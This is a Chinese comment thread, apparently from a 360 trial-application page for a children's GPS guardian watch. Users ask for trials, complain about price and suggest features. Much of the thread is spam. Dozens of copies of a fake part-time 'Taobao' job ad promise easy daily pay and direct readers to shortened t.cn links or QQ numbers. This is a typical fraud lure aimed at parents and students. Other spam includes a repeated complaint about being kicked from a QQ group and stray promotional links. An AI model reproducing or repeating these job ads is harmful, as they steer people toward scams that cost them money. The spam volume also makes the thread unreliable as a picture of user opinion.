支持360 支持儿童卫士 剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊
可以说是断电器吗
支持360 支持儿童卫士 剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊
支持360 支持儿童卫士 剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊
感觉是个非常实用的东西。
加个非正常摘下报警功能 防止不发份子直接把手表摘了 伤害孩子！
 具体工作是什么？
有这个，再也不用担心丢三落四的习惯了
我要报名。
真心希望能免费试用一下，现在的孩子动不动就离家出走，有了这个手表走到哪里都能知道，父母省心多了！
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班  族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】·
一直信赖360，刚巧在网上看到儿童卫士手表可以手机定位，现在正在做活动，免费试用，立马参加了，360网站真懂我们这些家长的心思太感动了，真心希望我的申请能通过，期盼好运。小编们也辛苦了。
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】#
怎么又是你
qq给您留下1319213162 小面包记得加   
哈哈 ！我也最近在弄这个
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】
价格是硬伤，戒烟是自己的自觉性。价格便宜可以买个玩玩还行
出来没有？多少钱一个
我暑假有空qq上聊。要快加我啊。17日加我啊加不了的话每个星期
就一百个，这么多人申请，僧多粥少啊！～
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
看着挺像银行里面扫描单据的那东西。
有意者请+ｑｑ １５２９５９４６９４ 报名
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】
很人性化啊，喜欢
这东西不错
快点出！！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】
做儿童节的礼物送给小朋友 ，真心是不错的活动，希望试用成功！
看起来功能好像挺强大。
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】
一直信赖360，刚巧在网上看到儿童卫士手表可以手机定位，现在正在做活动，免费试用，立马参加了，360网站真懂我们这些家长的心思太感动了，真心希望我的申请能通过，期盼好运。小编们也辛苦了
值得推广，赞一个
bucuo 
赖床一族能不能醒呢~
不错，休息日可以骑着它去散心了
一直想给孩子买个手表，正好咱们360搞试用，希望能申请成功，可以做为6.1的礼物送给孩子。
免费试用 http://zjclwy.taobao.com/tryacdetail.htm?spm=a1z10.1.w5003-7062423027.1.c6EUhI&amp;activityId=1325897&amp;scene=taobao_shop
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
免费试用 http://zjclwy.taobao.com/tryacdetail.htm?spm=a1z10.1.w5003-7062423027.1.c6EUhI&amp;activityId=1325897&amp;scene=taobao_shop
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】
看起来挺好，期待。
外观新颖，很智能的东东
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】.
信赖360报名
这个东西因该可以设计的更隐秘一点，如果真的遇到拐卖儿童的，第一时间可能就是把这个手表摘掉，可以设计成胸针，发卡，项链，笔，橡皮，文具等，小孩用的各种款式方便家长和小孩挑选，起到更好的保护作用。
感谢360一直给我们提供的信息安全保障，希望这次能有幸获得360儿童卫士送给孩子，有了它，孩子会说：爸爸妈妈再也不用担心我走丢了！我们家长会说：知道孩子去哪？so easy
高大上啊~
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】
好希望自己也能中个！
从去年就开始宣传了！！！我没有好运气，什么试用之类的都选不中，只求正式开放购买啊！！！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】.
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】@
很好用，不伤眼，从此爱上看书，有一土豪说，你想买一本是要20多块，你只要看40本书这个价格就赚回来了！很有看纸质书的感觉，推荐人手一个啊！~有一个日本大叔，被我诱惑的也买了一个，嘿嘿！~
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】%
希望能申领成功 送给孩子61礼物   一如既往的支持360
东西很好，就是价格太高了，有点望尘莫及
很有创意的新鲜玩意,时尚又实用,好,喜欢
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】$^
希望早点量产，另外可以加个小孩拨打110和家长电话的功能，可以实现双向通话更好。
挺好，啥时候推出啊。
我看过很多款手表手机，发现360这款最贴近儿童需求，
这个是真不错，希望实用
不是大众消费，再好也是浮云
对于消费者来说价格实惠又美观的东西容易接受!
这东西可以解决丢钥匙的烦恼了！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】 .
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】 %
有孩子的家庭对挺需要这样一个东西，它虽然不一定带来实质性的保护，但它起到一种警示，对于儿童安全来说，只要有百分之一的作用我都会去做，有些时候我们的付出其实就是给孩子们带来那百分之一的机会
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
有什么用吗？？？？
从未中过，希望这次能中。六一节，给个礼物吧！！！！
这款儿童手表什么时间有卖的？多少钱？ 
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】 .  
希望能申请成功，孩子会很喜欢，谢谢
建议添加一键通话功能
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】 
我们全家一直都信赖360，刚巧在网上看到儿童卫士手表可以手机定位，现在正在做活动，免费试用，立马参加了，360网站真懂我们这些家长的心思太感动了。万分感谢360一直给我们提供的信息安全保障，希望这次能有幸获得360儿童卫士送给孩子，期盼好运。小编们也辛苦了 
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】 $
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
很是期待，
刚刚申请了试用，希望可以申请得到。让我宝宝多一个保障。
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】 $
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】 .
建议：1、增加警报功能，用于紧急时刻小孩能报警呼救。2、防水。3、增加式样，还可以做成项链、钥匙扣等，样式卡通符合小孩习性，即能被小孩接收又便于隐蔽。4、定时功能
希望360把这样的技术多多推广，让更大多数的孩子都能用上这款产品，更多的保护儿童权益，当然要价格更合理一点，不要高到让大众百姓买不起的地步
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】 
真是客户体验！！
好是好，太贵了。一般百姓接受不了。
宝宝15个月了，正好合适使用这个。希望可以申请成功~~推广推广呀
期待早日上市，价格亲民。
为什么我所有的账号和邮箱都已经被申请过或者密码都不对？？why?
不错，最好还可以提供一些关于刷牙方面的意见！
款式饱满，时间表方便小孩识别。很好！为儿子申请了一个，希望如愿！
这东西可以防盗，因为我丈母娘头几天包包被抢了。丢了很多东西其中就包括钥匙，如果有了这个，就能知道丢的东西的具***置。这个东西我看好它。
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
价格多少啊？
不错，希望能试用上，孩子一定喜欢。
为儿子申请一个，希望能全方位的监护到他。
看样子真的不错。
有能收集密闭空间内粉尘的仪器设备吗？
期待实物销售
什么时候开始卖？200以下我就买
价格多少啊，这个很强大
有存储功能就好了,可以把家长的电话和家庭地址记录在里面,就不用写小卡片放在小孩子身上了.
好期待我们也能有一个
没看出哪儿智能了？和一般电动车除设计上没太大区别。
很期待。已经填了申请，不知能否被选中。 
这个东东什么时候出来？一定买一个！！！！那个长度方向能不能再缩短一点，30厘米有点长了。比如到20厘米左右。
很新奇，很期待能有机会试用
为儿子申请一个·多点安心保障·对儿子的关心 
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
希望到时价格能定得便宜点，买一个也值啊。
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】.
希望能申请成功
话说，这款东西让我想到了OPPO N1的小叮当。相类似的功能。这款东西的实用性还可以，就是距离有点远。最好是可设定响铃距离的。因为这样会有防盗功能。然后外观希望可以更多样。
期待能有一个
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】..
定位功能不错啊，我家小孩上街都是跑着走，追不上也不怕啦。
这些产品好是好哦,但是要买还是会感到肉疼呀!~除非特需要的那种
http://www.vdlnow.com/822142406
建议：1、增加警报功能，用于紧急时刻小孩能报警呼救。2、防水。3、增加式样，还可以做成项链、钥匙扣等，样式卡通符合小孩习性，即能被小孩接收又便于隐蔽。
很希望拥有一个高科技产品
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
太好了 好想现在就买一个来用啊，老公整天找不着钥匙，这下方便了，喜欢到爆啊
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】!
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】@
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】$
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】~
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】!@
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】$%
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】.
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
但愿能申请成功！！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】@
我现在就骑的跑狼的蓝牙功能的电动车，除了不能折叠和这个功能一样的。我花2400元买的哦
很想拥有这样的产品，对于小朋友很好。
非常希望这款手表能获取巨大成功，希望自己家的宝宝能成为幸运儿，最先一批试用到该款手表，360非常强大，非常贴近生活！！！
如果能得到试用太好了一定会很棒的
这个真心不错，孩子下半年就上小学了，一直不放心他自己到楼下玩，就担心跑没影了，找不到家！
很不错啊，给小孩带上
这是要火的节凑。。。厉害
什么时候再发售呢？、
价格要亲民哦，我给我爸妈公婆都买一个，太贵了可承受不起啊。好东西
只要定位很准，就好！好！
要是可以通话就更好了哈哈，有点贪心啊
希望天下所有的宝贝健康快乐的成长，关键是安全，360这款可以精准定位的手表可以让家人更安心，孩子更安全
希望能中到，给宝贝一个儿童节礼物，她肯定会很喜欢
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】.
这个不是太实用，但是挺好玩的
手表上面不要有  360 三个字更安全！！！！！！！！！！！！！！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】$
手表上面不要有  360 三个字更安全！！！！！！！！！！！！！！
手表上面不要有  360 三个字更安全！！！！！！！！！！！！！！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】%
如果定位很精确，那一定是家长们可以信赖的好产品，希望能申请成功！热切期待中！
争取选中哟，好期待这款手表
200以下。。还要流量费啊
建议1：耐摔2、防水3、样式上可以增加一些更隐蔽的4、自动报警（可以设定小孩活动范围，超出区域马上向父母手机报警）5、如果有条件增加针孔摄像头，保护孩子，随时了解孩子情况。
很新颖，期待能试用，从介绍和图片感觉很低不错，期待哟
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
孩子安全 家长放心
不能预约，没地方买
这个很好，我经常丢U盘，这个是一个很好有物件，期待
从大学到工作，到成家，用的电脑产品最多的应该就是360奇虎，这得益于大学的计算机老师，那也是第一次接触。正考虑这段时间给宝宝弄个定位器，希望能申请通过，期待。
很期待能试用
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
这东东是我们上班族的救星，但会不会影响电池寿命？充电过程中的辐射量会否比现行的充电器要大？
为了我的宝贝儿子，申请一个，来吧，我等着试用呢！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】$
非常不错的创意
能买一个也行。主要是有隐形性。不然被犯罪分子一看就知道是定位。那一点意义都没有。
价格不合理，
建议1：耐摔2、防水3、样式上可以增加一些更隐蔽的4、自动报警（可以设定小孩活动范围，超出区域马上向父母手机报警）5、如果有条件增加针孔摄像头，保护孩子，随时了解孩子情况。  
求申请成功啊，市面上的都是手机模式的，这款好啊，带在手上不用担心宝宝会丢失了。。。
完全赞同360U747568610的建议，建议：耐摔，防水，按键锁定（锁定后孩子不可乱按导致程序混乱），自动报警，增加与父母即时电联或者视频功能！
关爱孩子，珍惜孩子！360儿童卫士我们能试用后如果真的好会告知更多的人，杜绝那些残忍的意外......
这样手应该拿在哪里？
很不错的功能，有卖吗，怎么只找到申请，没有卖吗
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】.
意念控制是迟早要普及的东西，就像爱迪生发明电灯泡被认为只是新鲜一会儿的小玩意一样。
希望能申请到，每天接送不到位就难以安心工作
奇酷加油。儿童卫士加油。360加油。太火爆了。
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】$
等着使用那
哪里能买到 
刚刚申请了一个 期待中
创意不错，可是价钱有点不合理。
期待试用……
喜欢这款表，孩子也喜欢，希望可以试用到。。。。。
要是能把手机的录像功能给结合上就好了。开车时把手机卡上，即能行车记录又能充电，记录的数据存在这个仪器里。
不但功能正是我需要的，样子还好看 希望成功哦可以让女儿惊喜一下
一直支持360永远支持360
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
价格接受不了，折合人民币要5000多块钱了！
看到价格被吓到了！
看样子不错的哦
期待作品。建议，耐摔。质量安全。
这个东西不错，以后再也不担心不知道小孩在什么地方了
非常期待能试用，尤其是孩子很期待。
希望能中到，给宝贝一个儿童节礼物，她肯定会很喜欢 .关爱孩子，珍惜孩子！360儿童卫士我们能试用后如果真的好会告知更多的人，杜绝那些残忍的意外的事情发生.也能给家长一个放心！  
建议：外表大众话点更好，最好跟儿童手表外形差不多，这样不容易引起注意，更好的保护孩子。当然定位准是必须的。好期待能试用。
很久以前就在用360了，一直感觉比其他的同类产品好用，这次的儿童腕表很想要，很想知道孩子的一切，很希望能被幸运的抽到。
很不错的一个东西
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】.
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】..
刚申请了一个，很看好！！希望能抽到试用。。。。
车子是好，但太贵了
不错 款式 比较卡通 色彩绚丽 儿童很喜欢！就是不知道 抗磕碰 能力如何 儿童嬉戏 肯定会时不时的 磕碰到某些地方 比如墙 或者 摔跤压在地上。。。。。如果抗震能力表现突出 必定失款不错的卫士！
给宝贝一个儿童节礼物
这个东西不错，以后再也不担心不知道小孩在什么地方了希望能中到，给宝贝一个儿童节礼物，她肯定会很喜欢 .关爱孩子，珍惜孩子！360儿童卫士我们能试用后如果真的好会告知更多的人，杜绝那些残忍的意外的事情发生.也能给家长一个放心！  
给宝贝一个儿童节礼物
可以申请试用？？？不知道有没这样的机会
建议 360 尽快 量产 维护广大儿童的权益！！！
怎么 没有价格
很好的产品，这就就能对身体实时监控了，期待普及
之前在国外的网站上看到类似的产品。喜欢！！
dfg dfg dg df 
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
是个漂亮的小玩具，至于功能，嘿嘿！你懂得
期待  好新颖
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
这东东是我们上班族的救星，但会不会影响电池寿命？充电过程中的辐射量会否比现行的充电器要大？
车价是包含车上的美女？不要美女多少钱？
很好很喜欢
希望6月1日前能推出。
不知道是否有辐射，对孩子健康有没有影响
刚刚申请了一个，希望能得到申请！！！！！
期待。。。
孩子都喜欢玩水，估计这是小孩的通病，最关键希望能起到防水的作用，任何电子产品再先进，不能防水的话，一切都是无用功，希望厂家能做出这样的产品！
希望能可以成功
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
这个东西，很多年前就有了。记得上高中的时候买手机就买过一个小挂件，挂在手机上，有短信和电话就会一直闪。其实是一个道理，这个只不过集成到手机壳里了
奢嗜品！！！！！
正能量啊！早就应该研发这种产品了！必火
喜欢精准定位和实时录音这样对大人了解孩子的安全非常好，希望能试用到。
太有意思了！
不能接受如此高的价格！
期待能成功！
真心希望这是一款好产品，不仅针对儿童。
全都是监控心率的，有没有一种准备是可以24小时监控心电的，要是有就好了。24小时监控心电，可以用手机或者电脑看看心电图，心脏有问题的时候可以监控的到，到医院看病的时候也是很好的第一手资料。
